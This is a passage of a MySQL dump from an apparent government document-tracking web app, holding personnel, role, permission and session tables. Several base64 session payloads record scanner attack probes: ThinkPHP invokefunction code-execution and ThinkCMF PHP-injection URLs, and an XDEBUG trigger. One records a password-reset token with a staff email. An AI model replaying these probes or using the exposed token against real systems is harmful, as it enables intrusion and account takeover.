) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `personnel`
--

INSERT INTO `personnel` (`id`, `name`, `slug`, `department_id`, `office_id`, `div_unit_id`, `created_at`, `updated_at`) VALUES
(1, 'ICT Super Admin', 'ictuadmin@arta.gov.ph', '1', '1', '6', '2022-02-23 09:18:43', '2022-02-23 09:18:43');

-- --------------------------------------------------------

--
-- Table structure for table `roles`
--

CREATE TABLE `roles` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `guard_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `roles`
--

INSERT INTO `roles` (`id`, `name`, `guard_name`, `created_at`, `updated_at`) VALUES
(1, 'Admin', 'web', '2022-02-15 09:02:49', '2022-02-15 09:02:49'),
(2, 'SuperAdmin', 'web', '2022-02-15 14:50:19', '2022-02-15 14:50:19'),
(6, 'User', 'web', '2022-03-01 01:10:44', '2022-03-01 01:10:44'),
(7, 'Director', 'web', '2022-03-01 01:14:54', '2022-03-01 01:14:54'),
(9, 'ODG/ODDG', 'web', '2022-03-04 00:59:09', '2022-03-04 00:59:09');

-- --------------------------------------------------------

--
-- Table structure for table `role_has_permissions`
--

CREATE TABLE `role_has_permissions` (
  `permission_id` bigint(20) UNSIGNED NOT NULL,
  `role_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `role_has_permissions`
--

INSERT INTO `role_has_permissions` (`permission_id`, `role_id`) VALUES
(1, 1),
(3, 1),
(5, 1),
(6, 1),
(7, 1),
(9, 1),
(10, 1),
(11, 1),
(12, 1),
(13, 1),
(15, 1),
(1, 2),
(2, 2),
(3, 2),
(4, 2),
(5, 2),
(6, 2),
(7, 2),
(8, 2),
(9, 2),
(10, 2),
(11, 2),
(12, 2),
(13, 2),
(14, 2),
(15, 2),
(12, 6),
(13, 6),
(15, 6),
(10, 7),
(12, 7),
(13, 7),
(15, 7),
(9, 8),
(12, 8),
(13, 8),
(15, 8),
(9, 9),
(12, 9),
(13, 9),
(15, 9);

-- --------------------------------------------------------

--
-- Table structure for table `sessions`
--

CREATE TABLE `sessions` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` bigint(20) UNSIGNED DEFAULT NULL,
  `ip_address` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_agent` text COLLATE utf8mb4_unicode_ci,
  `payload` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_activity` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `sessions`
--

INSERT INTO `sessions` (`id`, `user_id`, `ip_address`, `user_agent`, `payload`, `last_activity`) VALUES
('3lYEZD4lKZStzT6S2p1Ca59FcXzt4FAInryC3BmD', NULL, '185.180.143.72', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiYnZGelVTOUV5Nnh2ME5sWmg0SEpad0JvdDZ2SjFVNFdLSGI3OENpSSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653337492),
('vY93W4lA72uz69ThQwVF4Y80OVCKuAQKut6zmMay', NULL, '139.162.215.70', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiU3NGM2NiYVNhcW1GaHVPNXpFYkN1RkR1cWdHaWRJU2s3QmRRTDhDSSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653342278),
('VeuJWIbwjQbKhu8ifZr1prPyj3m4SUzEgrfTMOiZ', NULL, '2.58.149.222', 'Linux Gnu (cow)', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibHMwNDhIaTRCd2dpb1hiS2NtUmx3ZTdqSklNYm15azV2UEowYXR1UiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653343202),
('JLK40zzPYlCsDy47leSD89QSWm4sMSaGRZrdm3Hm', NULL, '196.2.8.42', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoic0paYnU5QXk4TXVHTTU2eUVqNko1M1FVaXR3Q1V4eWE5N09JcE1qRyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653346577),
('Q0d6W90DyOgXsijjwaNLXO1gH3Z49iWAz2RsaJVz', NULL, '185.142.236.43', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibXdDMWhCZHdCUWtLMTZEejdVM1JlWUVyeFRpbjY1ZE1hRzlRUWk5VSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653346987),
('Aj2Cwuf74B6jArWAFRQH5j187Ch3K3GW7B8jTZ0G', NULL, '130.211.54.158', 'python-requests/2.27.1', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiNUhVRk1QaFFNMEFjcml1R3ZpQnEyNDU3ckpmMFpiMGtkMUxaeFIzaSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653346998),
('J3jnhAYFxFy0uyfQ99uqlIh6TN9vl6CBQP3bcBpS', NULL, '104.47.124.254', '', 'YToyOntzOjY6Il90b2tlbiI7czo0MDoicEF4bHdQZXdDcmM5dGNiOUJDYk1wVmRINVJxVlRxUThKdFFYU2J1QiI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==', 1653353826),
('TZfwNGmWg37ZwIAHNkYqSZ6aeORDdxn0v8fuQ5Ps', NULL, '40.94.227.78', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiTG1YRk13SkUyM2JDd0E0WlhtMllqRVFHVnVVdlRCcW5HZnlPVk5sbiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTQ3OiJodHRwOi8vZG9jdHJhY2tlci5hcnRhLmdvdi5waC9wYXNzd29yZC9yZXNldC9mY2I0MzhlZGQzZmJmYzA1MDQ4YWEzZmUzOTFmNTU2NDU1ODJjNmVlMGU5ZjEwOTdmZTg2MTc0NTAwNGEyN2YwP2VtYWlsPW1hcmlhbG9yZW5pZ25hY2lvJTQwYXJ0YS5nb3YucGgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653353839),
('u9IhbJKOuon8KTUfM5My0N0OprAtjO1LXDzKEApz', NULL, '40.94.227.52', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiRTNGY2VYT0NTQ0x2emh5Mktyd2xRWnJPRnAxdTk4Q1pDVmlrY0hqbCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTA5OiJodHRwOi8vZG9jdHJhY2tlci5hcnRhLmdvdi5waC9wYXNzd29yZC9yZXNldC9mY2I0MzhlZGQzZmJmYzA1MDQ4YWEzZmUzOTFmNTU2NDU1ODJjNmVlMGU5ZjEwOTdmZTg2MTc0NTAwNGEyN2YwIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==', 1653353839),
('jvANanfkp4b52GHPVZwz3wG2UYs21Fs8Rrc2D7PX', NULL, '104.47.124.254', '', 'YToyOntzOjY6Il90b2tlbiI7czo0MDoiRGMyNFZUTHhuWGZOb2UwdG82SHhkamo1cHhHMzFFQm1xUngwUDZ1RyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==', 1653353868),
('IaUtgTsnbS1uaeIlo2rhUQ1cZkQFEPN2XFFFbjX5', NULL, '161.49.176.228', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiazFvMjZCM3NRSmRSUWFpcWpvc0ljbEhmbVNWVWtBbG5lMkZkZms2bCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjk6Imh0dHA6Ly9kb2N0cmFja2VyLmFydGEuZ292LnBoIjt9fQ==', 1653354001),
('Twe75UCov5eP41Jg2WrRcbI8jBjDDMjKQfj5tTG3', NULL, '193.106.191.48', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiVE02M0M1UTJOb0QxM0wwUW9jMlNvRjJQQ1gxbnZ4bmF6aWlPQWw3eiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU1OiJodHRwOi8vMjAuMjQuMTguMjE4L2luZGV4LnBocD9mdW5jdGlvbj1jYWxsX3VzZXJfZnVuY19hcnJheSZzPSUyRkluZGV4JTJGJTVDdGhpbmslNUNhcHAlMkZpbnZva2VmdW5jdGlvbiZ2YXJzJTVCMCU1RD1tZDUmdmFycyU1QjElNUQlNUIwJTVEPUhlbGxvVGhpbmtQSFAyMSI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653357403),
('OkF8OYNQNO7Fzyi73lCmcR2RqhxXEpyhMBJrUmvD', NULL, '162.142.125.10', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiZzgzdmdaQXBsTDhjU3E4VHRNT1Judmtvck9hcktvZVRKQk1QVDkwZSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653357538),
('BfYR706FMIx0DVHrHEh2ALAlBohQSoqfgzkOJTz3', NULL, '162.142.125.10', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiM1gwQ2ExeThnR3l4TjZrdUNjWk85Z1F6ampNU2VEOEhJRld6NjZZRiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653357539),
('TfXcCvVTGEm91sDE0kxeKrfSMGjedTAcRCYCogKo', NULL, '193.106.191.48', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiNTRoZU1md05aTnBvek02alIwemhiUHM1TFM2ZW1TWEhqaE1uVVhQYSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6OTI6Imh0dHA6Ly8yMC4yNC4xOC4yMTgvP2E9ZmV0Y2gmY29udGVudD0lM0NwaHAlM0VkaWUlMjglNDBtZDUlMjhIZWxsb1RoaW5rQ01GJTI5JTI5JTNDJTJGcGhwJTNFIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==', 1653358822),
('EISvner27EYK6VqTsVRavHoEk9LvjICDo2uiDVCO', NULL, '47.93.98.233', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiQnk0cGhlbXlKeGhwc2NGdWJIVkVLSDZXVGZ1dWI3bm9PT3VmamdlUiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgvaW5kZXgucGhwIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==', 1653361443),
('ON1oqPVVOpTSigiFqZfnw0Td944fpKgbLmexjH5G', NULL, '193.106.191.48', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiS0lVSEwwalhXNzRiUVZ2Y2xWdW1YQ2FhWWxnSk9UQnVpcGpkN0c3bCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NTA6Imh0dHA6Ly8yMC4yNC4xOC4yMTgvP1hERUJVR19TRVNTSU9OX1NUQVJUPXBocHN0b3JtIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==', 1653362251),
('AwjF2VU2CrBrYqTWtAAMm9gu1EgYedLAuV9RB2Vi', NULL, '178.73.215.171', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiNDV6ak0xamFHQlRzbk9hRElnSVBsR0wyZk1DdlBRUTBabEZFSnlZSCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653362936),
('XLLfPsUGmjBgx0EepRxthhtwE9Ax3VQjCN6qc843', NULL, '52.151.55.146', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiRjNINDVBdVl1aEc1dG01Z1hMblc4VUtpcm1PSWJkblBMd2RMb0NpaiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653363881),
('KdiqYKBNaJEJAPb35VRn9yeEnrrWHghqduvEz1p3', NULL, '198.235.24.15', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiSVFHMmt4c1FBWmtaNjNvRXZJME56a2tsVXJVd0gwMTE1UTdRbHBJZSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653369613),
('UO4h8FJ3iHIFq7l0oOcRUmw69eunnbyEceBnOGnB', NULL, '185.180.143.18', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiYWZ2QkNudDJzOE5wZEtZWTE4RVVWczJzQ25aSzlkUjJaeURVRWJ5SSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653371730),
('V78ntFfdIyiwNMgfq4vXrv93fyBXfn2rzV5ySLkw', NULL, '193.106.191.48', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiRE5KNTU2UmpxRDhPd0R1N3FDOHNURXkzM3JiU2JNZW5ZWm5UenhWUiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653372541),
('wiCgVoWKPaZGp0GiydR55FGGr6XyD5OidFGn9gTl', NULL, '193.106.191.48', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiS0sxRUM5WVBYWHVVZ21BZVNmSm9PR29iVGJTOUQyVWtXcXJMN3o4diI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653374518),
('S8v8aYOVlS1FXa78kdzIi9Ogbssyjb0VJn78UOVb', NULL, '64.188.148.22', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiclhxSzVxYWRJcWM0QlJYV3FremtUNFI3dUxub1RPekR4bGpOSkF4QyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653380349),
('VqanT07aptFbWxFuevkwdapIO3FJs5fRIPHWKtDX', NULL, '192.241.208.82', 'Mozilla/5.0 zgrab/0.x', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiODlKQU5rQUQxU3E0eEdLNXJDb21ORVJleDlvOUdEbFIxejNUT2w2MiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653382251),
('xCXwUJNA6UfvdT3B7LsCB8H11BCLWpPuhHZX6JnI', NULL, '167.248.133.46', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiNTJzSkpDTDF3dWxrSTRLQjVaVXpQUUhIMUNicUtScUdBNmdNdHN2aSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653385382),
('U5Hf9lePgFAxdwyqCOvdtD7dCA3rHyl5fH1batES', NULL, '45.79.76.157', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiR09zeFJEZlB2T2hnbjdaSDhmNWk0QXRhZnN1T0RRazdJMEVROHpnNCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653388950),
('MUjUvivCKFt8fHObm45TBxonb6qIEXfcqLBSwl7H', NULL, '113.128.188.131', 'Mozilla/5.0', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiVmRNajlidVlzWFp6cEdwNXFqMER2SWt3SnI0a0dvaEpzeTh3ZGltbCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653390546),
('cTsTOqrmLozxJokHuREy8JeO1ysjzKcYcmOP1dVu', NULL, '113.128.188.131', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiUndrZ1NscFVDc0V2VUs5MlcydFRFUnpja3lHVTVYeEtzNmJoSFN4RSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653390548),
('JoXBpts04Yl2MZ7DL8wnXrW70lgyBch1v6m0BMjQ', NULL, '45.79.76.157', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiTVNSZXNxU0RyM2lQSWhLVUdUQUhDQ0ZkdXdDTWRvdUtCRmNJM09BWCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653390914),
('kOoSZDFSfH0slthyZ07V2I0ejeveegD0H7KzKYhx', NULL, '45.79.76.157', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiQ2N1UTVvOGZOSGJDa0pRWmgwSG9zVEV1emJHZlRFTUlzTlpMMUx4ZCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653390915),
('HdPfQ7BDAsUAGxalipeiWzLl9Go4ylcjTK0LeS4E', NULL, '128.14.141.34', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiVDdFN1hLbHFwQllqQ0QzWVZ5aDFySmZBVWxvMmc3QU0wZkx2RlgwSCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653390927),
('mlz8KQuEZxomlf5938dCL1cvuNGvRF6M3wMsARlY', NULL, '35.195.93.98', 'python-requests/2.27.1', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoieUNVRGY4MzI5Q3o4enY0ZzhIUUZSQVo5RFB6UkZ3OUhZeGxISVJKayI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653396823),
('jXwWpT5lmnAsraCRAU3BxTpfD2lOjKN2aub8tYWN', NULL, '184.105.247.254', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiVlFLc0pMTlJFcTJRNWl0MTJxUTdYbXEzUUxmNEFVNXdaTmJ4R1B6UiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653397656),
('VoI1kZwJOlq2uKB5kQwCS5ATutQrFVf7tRZhbIyN', NULL, '179.43.144.210', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiclFtQXV6RHhieFBDVTJYNFF3Z2RMZ3FUWXQyeWVJRXZtNDJVM244ZyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653399600),
('yaWKCOwZKUyAcAGlsAbJ5DGQAqUzDXAZCv6Zm5hw', NULL, '45.79.204.46', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiaHlIaWxhQmZRN0c2SENPSkh3UUNNSjJpRmNsMTBDVmRUbmJTZ1ZBNSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653401732),
('NxJGQNkYKxCwsoqvdxo29sQ5rf17ouWSEZYMC4Jd', NULL, '64.227.166.26', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiQU1NVFFvTDk4QjJCemU0bHA4TFdUU3ZMMlQ2T0lMYXB4NDN5d043SSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653402653),
('ZGnnJAfWeBqNk905uUsgNfINfcbwnRxyHLcFJvm5', NULL, '103.254.57.126', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibFlUWTdja0RQd21xTmlNM0l5Yjlpek53OWpKTkgxcjF3Z25PU3dZcyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653406056),
('iyFPMvKjuYsAVgVIq9bkNIDBKjvX5NH4GHmUNfbn', NULL, '103.73.183.183', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoidEpld2pZMmI2RDkzSExyNWdXdXFTRllUZ1VGYWlJeUp0RkNFU0ZPcSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653408025),
